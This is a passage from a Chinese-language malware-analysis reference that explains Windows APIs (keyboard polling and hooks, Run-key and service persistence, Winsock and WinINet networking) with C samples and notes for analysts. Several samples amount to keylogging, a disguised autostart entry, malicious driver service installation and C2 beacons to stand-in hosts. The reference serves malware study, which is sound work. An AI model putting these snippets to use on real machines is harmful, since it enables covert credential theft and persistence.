        GetWindowTextA(h, title, sizeof(title));
        printf("窗口标题: %s\n", title);
    }
    return 0;
}
```

**在病毒分析中的价值**：窗口标题窃取/欺骗、或遍历前台窗口读取文本都属此列；键盘记录器也常先 `GetWindowTextA` 拿到当前窗口标题，从而把按键按“目标程序”分类存储。

## GetAsyncKeyState（）：检测按键状态

判断指定虚拟键当前是否被按下，或自上次调用以来是否有按下。

**函数原型**：
```c
SHORT GetAsyncKeyState(
  int vKey                             // 虚拟键码
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `vKey` | 虚拟键码，如 `VK_LBUTTON`、`VK_SPACE`、`0x41`(A 键)。 |

**返回值**：返回 16 位状态。最高位为 1 表示当前按下；最低位为 1 表示自上次调用后按下过。注意需 `& 0x8000` 判断当前按下。

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    printf("请按 F12 退出…\n");
    while (1) {
        // 键盘记录：检测按下过的每个字母键
        for (int k = 0x41; k <= 0x5A; k++) {   // A-Z
            if (GetAsyncKeyState(k) & 1) {
                printf("捕获按键: %c\n", k);
            }
        }
        if (GetAsyncKeyState(VK_F12) & 0x8000) break;
        Sleep(30);
    }
    return 0;
}
```

**在病毒分析中的价值**：`GetAsyncKeyState` 轮询是最常见的无钩子键盘记录实现之一，免安装全局钩子、隐蔽性强。看到对 `VK_*` 的轮询循环即可判定键盘记录能力；它对登录框密码、聊天输入的窃取是盗号木马核心功能。

## SetWindowsHookExA（）：安装系统钩子

安装一个钩子（键盘/鼠标/消息等），使回调函数被注入到相关进程以监控或改写事件。

**函数原型**：
```c
HHOOK SetWindowsHookExA(
  int       idHook,                     // 钩子类型
  HOOKPROC  lpfn,                       // 回调函数
  HINSTANCE hMod,                       // 含回调的模块句柄
  DWORD     dwThreadId                  // 线程 ID（0 = 全局）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `idHook` | `int` | 钩子类型：`WH_KEYBOARD_LL`(低级键盘，全局记录按键)、`WH_MOUSE_LL`(鼠标)、`WH_GETMESSAGE` 等。 |
| `lpfn` | `HOOKPROC` | 回调函数指针（低级钩子回调需在 `hMod` 所在模块内）。 |
| `hMod` | `HINSTANCE` | 回调所在 DLL/EXE 的模块句柄。 |
| `dwThreadId` | `DWORD` | 挂钩的线程；`0` 表示对系统中所有线程生效（全局钩子）。 |

**返回值**：
- **成功**：返回钩子句柄（`HHOOK`）
- **失败**：返回 `NULL`

**使用示范**：
```c
#include <windows.h>

// 低级键盘钩子回调：记录每个键
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {
            // 记录 ks->vkCode……
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK hHook = SetWindowsHookExA(WH_KEYBOARD_LL,
                    LowLevelKeyboardProc,
                    GetModuleHandleA(NULL), 0);
    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    UnhookWindowsHookEx(hHook);
    return 0;
}
```

**在病毒分析中的价值**：`WH_KEYBOARD_LL` 全局低级键盘钩子是键盘记录/银行木马的主流实现；它还能在**另一个进程的上下文**里执行回调（钩子 DLL 注入）。检测回调地址落在样本自己代码而非系统模块，即恶意行为佐证。


# Windows API (advapi32.dll)

advapi32.dll 提供**高级系统服务**：注册表访问、服务（Service）管理、安全账户/令牌、加密（CryptoAPI）等。恶意代码中最常利用它做**注册表自启动持久化**和**开机服务持久化**。

## RegOpenKeyExA（）：打开注册表键

打开一个已存在的注册表键，得到其句柄用于后续读写。

**函数原型**：
```c
LSTATUS RegOpenKeyExA(
  HKEY   hKey,                          // 根键
  LPCSTR lpSubKey,                      // 子键路径
  DWORD  ulOptions,                     // 保留，传 0
  REGSAM samDesired,                    // 需要的访问权限
  PHKEY  phkResult                      // 输出键句柄
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hKey` | `HKEY` | 根键：`HKEY_LOCAL_MACHINE`、`HKEY_CURRENT_USER`、`HKEY_CLASSES_ROOT` 等。 |
| `lpSubKey` | `LPCSTR` | 子键路径，如 `"Software\\Microsoft\\Windows\\CurrentVersion\\Run"`。 |
| `samDesired` | `REGSAM` | 访问权限：`KEY_READ`、`KEY_SET_VALUE`、`KEY_ALL_ACCESS` 等。 |
| `phkResult` | `PHKEY` | 输出，返回打开的键句柄（用完 `RegCloseKey`）。 |

**返回值**：`ERROR_SUCCESS`(0) 成功；其他为错误码，如 `ERROR_FILE_NOT_FOUND`。

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HKEY hKey;
    LONG ret = RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_QUERY_VALUE, &hKey);
    if (ret == ERROR_SUCCESS) {
        printf("已打开 Run 键\n");
        RegCloseKey(hKey);
    }
    return 0;
}
```

**运行结果示范**：
```text
已打开 Run 键
```

**在病毒分析中的价值**：`...\CurrentVersion\Run` 是**最经典的自启动位置**。恶意程序写自身路径到该键即可每次登录自动运行；看到样本打开 Run/RunOnce/StartupApproved 键即可判定持久化意图。

## RegCreateKeyExA（）：创建注册表键

创建（若不存在）并打开一个注册表键，通常与写值搭配使用。

**函数原型**：
```c
LSTATUS RegCreateKeyExA(
  HKEY   hKey,                          // 根键
  LPCSTR lpSubKey,                      // 子键路径（可多层）
  DWORD  Reserved,                      // 传 0
  LPSTR  lpClass,                       // 类名（NULL）
  DWORD  dwOptions,                     // 选项（0）
  REGSAM samDesired,                    // 访问权限
  const LPSECURITY_ATTRIBUTES lpSecurityAttributes, // NULL
  PHKEY  phkResult,                     // 输出键句柄
  LPDWORD lpdwDisposition               // 输出：已创建或已打开
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hKey` / `lpSubKey` | `HKEY` / `LPCSTR` | 根键与要创建的子键路径。 |
| `samDesired` | `REGSAM` | 权限，常用 `KEY_SET_VALUE \| KEY_QUERY_VALUE`。 |
| `phkResult` | `PHKEY` | 输出键句柄。 |
| `lpdwDisposition` | `LPDWORD` | 可选，接收 `REG_CREATED_NEW_KEY`(1) 或 `REG_OPENED_EXISTING_KEY`(2)。 |

**返回值**：`ERROR_SUCCESS` 成功。

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HKEY hKey;
    DWORD disp;
    LONG ret = RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, &disp);
    if (ret == ERROR_SUCCESS) {
        RegCloseKey(hKey);
    }
    return 0;
}
```

**在病毒分析中的价值**：先 `RegCreateKeyExA` 再造出自启动/自启动项、COM 劫持或策略注入键。观察完整键路径即可判断持久化手法（Run、`Image File Execution Options`、`Winlogon` 等）。

## RegSetValueExA（）：写入注册表值

向已打开的键写入一个值（字符串/二进制/DWORD 等）。

**函数原型**：
```c
LSTATUS RegSetValueExA(
  HKEY        hKey,                     // 键句柄
  LPCSTR      lpValueName,              // 值名称
  DWORD       Reserved,                 // 传 0
  DWORD       dwType,                   // 数据类型
  const BYTE *lpData,                   // 数据
  DWORD       cbData                    // 数据字节数
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hKey` | `HKEY` | 键句柄，需带 `KEY_SET_VALUE` 权限。 |
| `lpValueName` | `LPCSTR` | 值名，如 `"Updater"`。 |
| `dwType` | `DWORD` | 类型：`REG_SZ`(字符串)、`REG_EXPAND_SZ`(含环境变量的字符串)、`REG_BINARY`、`REG_DWORD`。 |
| `lpData` | `const BYTE*` | 指向数据的指针。 |
| `cbData` | `DWORD` | 数据字节数。 |

**返回值**：`ERROR_SUCCESS` 成功。

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    const char *path = "\"C:\\Users\\Public\\svchost.exe\"";
    LONG ret = RegSetValueExA(hKey, "SecurityUpdate",
                 0, REG_SZ, (const BYTE *)path,
                 (DWORD)strlen(path) + 1);
    if (ret == ERROR_SUCCESS) {
        printf("自启动项写入成功\n");
    }
    RegCloseKey(hKey);
    return 0;
}
```

**运行结果示范**：
```text
自启动项写入成功
```

**在病毒分析中的价值**：写 `Run` 键值指向恶意程序，即“登录自启动”持久化。分析时读取该值能看到完整命令行；勒索软件还用它写入提示信息/壁纸配置。

## RegQueryValueExA（）：读取注册表值

读取指定注册表值的内容与类型。

**函数原型**：
```c
LSTATUS RegQueryValueExA(
  HKEY    hKey,                         // 键句柄
  LPCSTR  lpValueName,                  // 值名
  LPDWORD lpReserved,                   // NULL
  LPDWORD lpType,                       // 输出类型
  LPBYTE  lpData,                       // 输出数据缓冲区（可 NULL 探测大小）
  LPDWORD lpcbData                      // 输入缓冲区大小 / 输出实际大小
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hKey` | `HKEY` | 键句柄，需 `KEY_QUERY_VALUE`。 |
| `lpValueName` | `LPCSTR` | 要读取的值名。 |
| `lpData` | `LPBYTE` | 数据缓冲；传 `NULL` 且 `lpcbData` 给地址时，用于先查询所需大小。 |
| `lpcbData` | `LPDWORD` | 输入输出：传入缓冲区大小，返回实际数据大小。 |

**返回值**：`ERROR_SUCCESS` 成功；`ERROR_FILE_NOT_FOUND` 表示值不存在。

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    HKEY hKey;
    char data[512] = {0};
    DWORD size = sizeof(data);
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "SecurityUpdate", NULL, NULL,
                             (LPBYTE)data, &size) == ERROR_SUCCESS) {
            printf("自启动命令: %s\n", data);
        }
        RegCloseKey(hKey);
    }
    return 0;
}
```

**运行结果示范**：
```text
自启动命令: "C:\Users\Public\svchost.exe"
```

**在病毒分析中的价值**：恶意代码读注册表取配置（C2、密钥）或检测自身持久化是否成功；安全人员逆向时也可用同等 API 读取关键键值还原配置。对 `Run` 键做快照比对是排查“重启后又中招”的常用手段。


## OpenSCManagerA（）：打开服务控制管理器

连接本机（或远程）的服务控制管理器（SCM），为后续创建/打开服务做准备。

**函数原型**：
```c
SC_HANDLE OpenSCManagerA(
  LPCSTR lpMachineName,                 // 机器名（NULL = 本机）
  LPCSTR lpDatabaseName,                // 服务数据库（SERVICES_ACTIVE_DATABASE）
  DWORD  dwDesiredAccess                // 访问权限
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpMachineName` | `LPCSTR` | 本机传 `NULL`。 |
| `lpDatabaseName` | `LPCSTR` | 常传 `SERVICES_ACTIVE_DATABASE` 或 `NULL`。 |
| `dwDesiredAccess` | `DWORD` | 权限，创建服务用 `SC_MANAGER_CREATE_SERVICE`，管理用 `SC_MANAGER_ALL_ACCESS`。 |

**返回值**：
- **成功**：返回 SCM 句柄
- **失败**：返回 `NULL`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CREATE_SERVICE);
    if (hSCM) {
        printf("SCM 已打开\n");
        // 之后 CreateServiceA 安装恶意服务
        CloseServiceHandle(hSCM);
    }
    return 0;
}
```

**在病毒分析中的价值**：普通程序极少操作服务管理器。样本若 `OpenSCManagerA` 接 `CreateServiceA`，几乎可以断定它在安装**常驻恶意服务**（内核驱动/后门服务）。

## CreateServiceA（）：创建服务

在服务数据库中注册一个 Windows 服务（可指定开机自动启动）。

**函数原型**：
```c
SC_HANDLE CreateServiceA(
  SC_HANDLE hSCManager,                 // SCM 句柄
  LPCSTR    lpServiceName,              // 服务内部名
  LPCSTR    lpDisplayName,              // 显示名
  DWORD     dwDesiredAccess,            // 权限
  DWORD     dwServiceType,              // 类型
  DWORD     dwStartType,                // 启动类型
  DWORD     dwErrorControl,             // 错误控制
  LPCSTR    lpBinaryPathName,           // 服务程序路径
  LPCSTR    lpLoadOrderGroup,           // 组（NULL）
  LPDWORD   lpdwTagId,                  // NULL
  LPCSTR    lpDependencies,             // 依赖（NULL）
  LPCSTR    lpServiceStartName,         // 运行账户（NULL = LocalSystem）
  LPCSTR    lpPassword                  // 账户密码（NULL）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hSCManager` | `SC_HANDLE` | 来自 `OpenSCManagerA`，需 `SC_MANAGER_CREATE_SERVICE`。 |
| `lpServiceName` | `LPCSTR` | 服务内部名称（唯一标识，如 `"WinDefenderSvc"`）。 |
| `dwServiceType` | `DWORD` | `SERVICE_WIN32_OWN_PROCESS`（独立进程）或 `SERVICE_KERNEL_DRIVER`（驱动）。 |
| `dwStartType` | `DWORD` | `SERVICE_AUTO_START`(开机自动)、`SERVICE_DEMAND_START`(手动)、`SERVICE_BOOT_START`(驱动引导期)。 |
| `lpBinaryPathName` | `LPCSTR` | 可执行文件完整路径（恶意程序自身或驱动的 .sys）。 |

**返回值**：
- **成功**：返回服务句柄
- **失败**：返回 `NULL`（已存在则 `GetLastError` 为 `ERROR_SERVICE_EXISTS`）

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) return 1;

    SC_HANDLE hSvc = CreateServiceA(hSCM,
        "MyDriver", "My System Driver", SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        "C:\\Windows\\System32\\drivers\\evil.sys",
        NULL, NULL, NULL, NULL, NULL);
    if (hSvc) {
        printf("服务创建成功\n");
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hSCM);
    return 0;
}
```

**运行结果示范**：
```text
服务创建成功
```

**在病毒分析中的价值**：创建**内核驱动服务**并把 `.sys` 放入 `drivers` 目录，是 rootkit/免杀驱动的标准安装法；创建自启动的 `SERVICE_WIN32_OWN_PROCESS` 服务则是后门持久化。服务名与二进制路径是排查与清除的关键。

## StartServiceA（）：启动服务

启动已创建的服务（执行其入口 / 加载驱动）。

**函数原型**：
```c
BOOL StartServiceA(
  SC_HANDLE hService,                   // 服务句柄
  DWORD     dwNumServiceArgs,           // 参数个数
  LPCSTR    *lpServiceArgVectors        // 参数数组
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hService` | `SC_HANDLE` | 服务句柄（`CreateServiceA`/`OpenServiceA` 返回）。 |
| `dwNumServiceArgs` | `DWORD` | 启动参数个数，通常 `0`。 |
| `lpServiceArgVectors` | `LPCSTR*` | 参数指针数组，无参时传 `NULL`。 |

**返回值**：
- **成功**：返回非零值（`TRUE`）
- **失败**：返回 `FALSE`

**使用示范**：
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // 假设服务已通过 CreateServiceA 创建（名 "MyDriver"）
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    SC_HANDLE hSvc = OpenServiceA(hSCM, "MyDriver", SERVICE_START);
    if (hSvc) {
        if (StartServiceA(hSvc, 0, NULL)) {
            printf("服务已启动（驱动已加载）\n");
        }
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hSCM);
    return 0;
}
```

**在病毒分析中的价值**：驱动类恶意代码 `CreateServiceA` 后紧接 `StartServiceA` 触发加载。执行到这一步意味着恶意驱动已进入内核；动态分析应在 `StartServiceA` 返回前抓取内存/设断观察驱动初始化。


# Windows API (ws2_32.dll)

ws2_32.dll 是 **Winsock2 网络编程**库，提供 TCP/UDP 套接字通信。绝大多数远控木马、下载器、反弹 Shell 都基于它实现与 C2 服务器的通信，是恶意代码分析的高频函数集。

## WSAStartup（）：初始化 Winsock

初始化 Winsock 库（使用套接字函数前必须先调用），指定需要的版本。

**函数原型**：
```c
int WSAStartup(
  WORD      wVersionRequested,          // 请求的版本（高位主版本、低位次版本）
  LPWSADATA lpWSAData                   // 输出：库实现信息
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `wVersionRequested` | `WORD` | 如 `MAKEWORD(2,2)` 请求 2.2 版。 |
| `lpWSAData` | `LPWSADATA` | 输出结构，含支持的最高版本等信息。 |

**返回值**：
- **成功**：返回 `0`
- **失败**：返回非 0 错误码

**使用示范**：
```c
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) == 0) {
        printf("Winsock 初始化成功\n");
        // 之后可 socket/connect……
        WSACleanup();
    }
    return 0;
}
```

**运行结果示范**：
```text
Winsock 初始化成功
```

**在病毒分析中的价值**：几乎所有网络功能都以 `WSAStartup` 开头。在它之后下断点能快速定位网络初始化，再往后跟 `connect`/`send` 即可找到 C2 地址与端口（或 DNS 查询目标）。

## socket（）：创建套接字

创建一个套接字并返回其句柄，供 connect/bind/send 使用。

**函数原型**：
```c
SOCKET socket(
  int af,                               // 地址族
  int type,                             // 类型
  int protocol                          // 协议
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `af` | `int` | 地址族，`AF_INET`(IPv4)、`AF_INET6`(IPv6)。 |
| `type` | `int` | `SOCK_STREAM`(TCP 流)、`SOCK_DGRAM`(UDP 数据报)。 |
| `protocol` | `int` | 协议：`IPPROTO_TCP`、`IPPROTO_UDP`，或传 `0` 由系统推断。 |

**返回值**：
- **成功**：返回套接字句柄（`SOCKET`）
- **失败**：返回 `INVALID_SOCKET`（`~0`），可用 `WSAGetLastError()`

**使用示范**：
```c
#include <winsock2.h>
#include <stdio.h>

int main() {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s != INVALID_SOCKET) {
        printf("套接字已创建: %llu\n", (unsigned long long)s);
        closesocket(s);
    }
    return 0;
}
```

**在病毒分析中的价值**：TCP 套接字 + 后续 `connect` 是反弹/直连 C2 的骨架。记录 `socket` 返回后传给的 `connect` 目标即可定位 C2 服务器。

## htons（）：主机序转网络序

把 16 位整数从主机字节序转换为网络字节序（大端），常用于端口号。

**函数原型**：
```c
u_short htons(
  u_short hostshort                     // 主机序数值
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `hostshort` | 主机序的 16 位值，如端口号 `4444`。 |

**返回值**：返回网络序的 16 位值。

**使用示范**：
```c
#include <winsock2.h>
#include <stdio.h>

int main() {
    u_short port = htons(4444);       // 用于 sockaddr_in.sin_port
    printf("网络序端口: 0x%04X\n", port);
    return 0;
}
```

**运行结果示范**：
```text
网络序端口: 0x5C11
```

**在病毒分析中的价值**：`htons` 的参数就是**明文端口**。在 x64dbg 的 `htons` 断点看栈上参数，能直接读出木马的监听/连接端口（配合 `inet_addr` 得 IP）。

## inet_addr（）：点分字符串转 32 位地址

把 `"a.b.c.d"` 形式的 IP 字符串转成 32 位网络字节序整数。

**函数原型**：
```c
unsigned long inet_addr(
  const char *cp                        // IP 字符串
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `cp` | 点分十进制的 IPv4 字符串，如 `"192.168.1.10"`。 |

**返回值**：
- **成功**：返回网络序的 32 位 IP
- **失败**：返回 `INADDR_NONE`(`0xFFFFFFFF`)

**使用示范**：
```c
#include <winsock2.h>
#include <stdio.h>

int main() {
    unsigned long ip = inet_addr("192.168.1.10");
    if (ip != INADDR_NONE) {
        printf("转换成功: 0x%08X\n", ip);
    }
    return 0;
}
```

**在病毒分析中的价值**：若样本直接内置 IP（硬编码 C2 而非域名），在 `inet_addr`/`inet_ntoa` 断点即可读出地址。配合 `htons` 的端口号，C2 就确定了。

## connect（）：连接远程服务器

把套接字连接到指定 IP:端口（TCP 三次握手）。

**函数原型**：
```c
int connect(
  SOCKET                s,             // 套接字
  const struct sockaddr *name,         // 目标地址结构
  int                   namelen        // 结构长度
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `s` | `SOCKET` | `socket()` 返回的套接字。 |
| `name` | `struct sockaddr*` | 指向 `sockaddr_in`，含 IP 与端口（`sin_family=AF_INET`）。 |
| `namelen` | `int` | `sizeof(sockaddr_in)`。 |

**返回值**：
- **成功**：返回 `0`
- **失败**：返回 `SOCKET_ERROR`(`-1`)

**使用示范**：
```c
#include <winsock2.h>
#include <stdio.h>

int main() {
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(4444);
    sa.sin_addr.s_addr = inet_addr("192.168.1.10");

    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
        printf("已连接 C2: 192.168.1.10:4444\n");
    }
    closesocket(s);
    WSACleanup();
    return 0;
}
```

**运行结果示范**：
```text
已连接 C2: 192.168.1.10:4444
```

**在病毒分析中的价值**：`connect` 的 `sockaddr_in` 参数在栈上清晰可见——这是定位 C2 **IP 和端口**最直接的位置。DNS 类木马此处则先是 `gethostbyname`/`getaddrinfo` 解析域名。


## send（）：发送数据

通过已连接套接字发送数据到对端（C2 上报/命令回传）。

**函数原型**：
```c
int send(
  SOCKET      s,                        // 套接字
  const char *buf,                      // 数据缓冲区
  int         len,                      // 数据长度
  int         flags                     // 标志（0）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `s` | `SOCKET` | 已连接套接字。 |
| `buf` | `const char*` | 要发送的数据。 |
| `len` | `int` | 发送字节数。 |
| `flags` | `int` | 一般为 `0`。 |

**返回值**：返回实际发送的字节数；`SOCKET_ERROR`(`-1`) 表示失败。

**使用示范**：
```c
#include <winsock2.h>
#include <stdio.h>

int main() {
    // 假设 s 已 connect 到 C2
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    const char *beacon = "GET /start HTTP/1.1\r\nHost: c2.example.com\r\n\r\n";
    int sent = send(s, beacon, (int)strlen(beacon), 0);
    if (sent > 0) {
        printf("已发送 %d 字节\n", sent);
    }
    closesocket(s);
    return 0;
}
```

**在病毒分析中的价值**：`send` 的缓冲区就是木马**外发**的数据（心跳、受害信息、窃取结果）。断点读 `buf` 能还原其 C2 协议格式与字段内容，对写解密/模拟很有用。

## recv（）：接收数据

从已连接套接字接收数据到缓冲区（读取 C2 下发的指令/载荷）。

**函数原型**：
```c
int recv(
  SOCKET s,                             // 套接字
  char  *buf,                           // 接收缓冲区
  int    len,                           // 缓冲区大小
  int    flags                          // 标志（0）
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `s` | `SOCKET` | 已连接套接字。 |
| `buf` | `char*` | 存放接收数据的缓冲区。 |
| `len` | `int` | 缓冲区大小。 |
| `flags` | `int` | 一般为 `0`。 |

**返回值**：返回实际接收的字节数；`0` 表示对端关闭；`SOCKET_ERROR` 表示出错。

**使用示范**：
```c
#include <winsock2.h>
#include <stdio.h>

int main() {
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    char buf[4096] = {0};
    int n = recv(s, buf, sizeof(buf) - 1, 0);
    if (n > 0) {
        printf("收到 %d 字节: %s\n", n, buf);
        // 解析 C2 指令并执行……
    }
    return 0;
}
```

**在病毒分析中的价值**：`recv` 收到的是 C2 **指令/载荷**，通常是加密/编码后的字节。分析要结合解密例程（XOR、RC4、base64）还原明文；`recv` 返回后第一个处理函数的断点是解密入口。

## closesocket（）：关闭套接字

关闭套接字句柄，释放连接资源（断连/结束通信）。

**函数原型**：
```c
int closesocket(
  SOCKET s                              // 套接字
);
```

**参数说明**：

| 参数 | 说明 |
| :--- | :--- |
| `s` | 要关闭的套接字句柄。 |

**返回值**：
- **成功**：返回 `0`
- **失败**：返回 `SOCKET_ERROR`

**使用示范**：
```c
#include <winsock2.h>
#include <stdio.h>

int main() {
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    // 通信结束……
    if (closesocket(s) == 0) {
        printf("连接已关闭\n");
    }
    return 0;
}
```

**在病毒分析中的价值**：木马结束一次信标通信后会 `closesocket` 再重新 `connect`，形成“连→传→断→再连”的循环。以 `closesocket` 为断点能观察其通信节奏（心跳间隔）。


# Windows API (wininet.dll)

wininet.dll 提供 **Internet 高层 API**，封装 HTTP/HTTPS 协议，常用于下载器、C2 通信（比裸 Winsock 更省事，能直接用 HTTPS）。

## InternetOpenA（）：初始化 WinINet

初始化 Internet 会话，返回会话句柄（后续所有调用都基于它）。

**函数原型**：
```c
HINTERNET InternetOpenA(
  LPCSTR lpszAgent,                     // 用户代理（如 "Mozilla/5.0"）
  DWORD  dwAccessType,                  // 访问类型
  LPCSTR lpszProxyName,                 // 代理名（可 NULL）
  LPCSTR lpszProxyBypass,               // 代理绕过列表（可 NULL）
  DWORD  dwFlags                        // 标志
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `lpszAgent` | `LPCSTR` | 标识程序的 User-Agent 字符串，木马常用合法浏览器 UA 伪装。 |
| `dwAccessType` | `DWORD` | `INTERNET_OPEN_TYPE_DIRECT`(直连)、`INTERNET_OPEN_TYPE_PRECONFIG`(用系统代理) 等。 |
| `dwFlags` | `DWORD` | 一般为 `0`；可含 `INTERNET_FLAG_ASYNC`。 |

**返回值**：
- **成功**：返回会话句柄
- **失败**：返回 `NULL`

**使用示范**：
```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

int main() {
    HINTERNET hNet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                   INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hNet) {
        printf("Internet 会话已打开\n");
        // 之后 InternetConnectA/HttpOpenRequestA……
    }
    return 0;
}
```

**在病毒分析中的价值**：使用 wininet 的木马在 `InternetOpenA` 能直接看到其 UA。伪造主流浏览器 UA 是为规避流量检测；用户代理字符串本身可作为网络侧的 IOC。

## InternetConnectA（）：连接服务器

基于会话句柄建立到指定服务器的连接（HTTP 服务器或 FTP）。

**函数原型**：
```c
HINTERNET InternetConnectA(
  HINTERNET     hInternet,              // InternetOpen 返回的会话
  LPCSTR        lpszServerName,         // 主机名或 IP
  INTERNET_PORT nServerPort,            // 端口（INTERNET_DEFAULT_HTTP_PORT 等）
  LPCSTR        lpszUserName,           // 用户名（NULL）
  LPCSTR        lpszPassword,           // 密码（NULL）
  DWORD         dwService,              // INTERNET_SERVICE_HTTP 等
  DWORD         dwFlags,                // 0
  DWORD_PTR     dwContext               // 0
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hInternet` | `HINTERNET` | 会话句柄。 |
| `lpszServerName` | `LPCSTR` | **服务器域名/IP**——恶意 C2 直接体现在这里。 |
| `nServerPort` | `INTERNET_PORT` | 端口，如 `INTERNET_DEFAULT_HTTP_PORT`(80)、`INTERNET_DEFAULT_HTTPS_PORT`(443)。 |
| `dwService` | `DWORD` | `INTERNET_SERVICE_HTTP`、`INTERNET_SERVICE_FTP`。 |

**返回值**：
- **成功**：返回连接句柄
- **失败**：返回 `NULL`

**使用示范**：
```c
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

int main() {
    HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConn = InternetConnectA(hNet, "c2.example.com",
                        INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL,
                        INTERNET_SERVICE_HTTP, 0, 0);
    if (hConn) {
        printf("已连接服务器 c2.example.com:443\n");
    }
    return 0;
}
```

**在病毒分析中的价值**：`InternetConnectA` 的 `lpszServerName` 参数即 **C2 域名**（明文可见）。配合 `nServerPort` 即可得到完整的 C2 端点，是威胁情报 IOK 提取的核心位置。

## HttpOpenRequestA（）：创建 HTTP 请求

在连接句柄上构造一个 HTTP 请求（指定方法、URI、版本等）。

**函数原型**：
```c
HINTERNET HttpOpenRequestA(
  HINTERNET hConnect,                   // InternetConnect 返回的连接
  LPCSTR    lpszVerb,                   // 方法：GET/POST 等
  LPCSTR    lpszObjectName,             // URI（路径）
  LPCSTR    lpszVersion,                // 协议版本（NULL = HTTP/1.1）
  LPCSTR    lpszReferer,                // 来源（NULL）
  LPCSTR    *lpszAcceptTypes,           // Accept 类型（NULL）
  DWORD     dwFlags,                    // INTERNET_FLAG_SECURE 等
  DWORD_PTR dwContext                   // 0
);
```

**参数说明**：

| 参数 | 类型 | 说明 |
| :--- | :--- | :--- |
| `hConnect` | `HINTERNET` | 连接句柄。 |
| `lpszVerb` | `LPCSTR` | HTTP 方法，如 `"GET"`、`"POST"`。 |
| `lpszObjectName` | `LPCSTR` | 请求的 URI 路径，如 `"/gate.php"`——C2 通信路径。 |
| `dwFlags` | `DWORD` | HTTPS 时加 `INTERNET_FLAG_SECURE`；常用 `INTERNET_FLAG_RELOAD` 等。 |

**返回值**：
- **成功**：返回请求句柄
- **失败**：返回 `NULL`

**使用示范**：
```c
#include <windows.h>
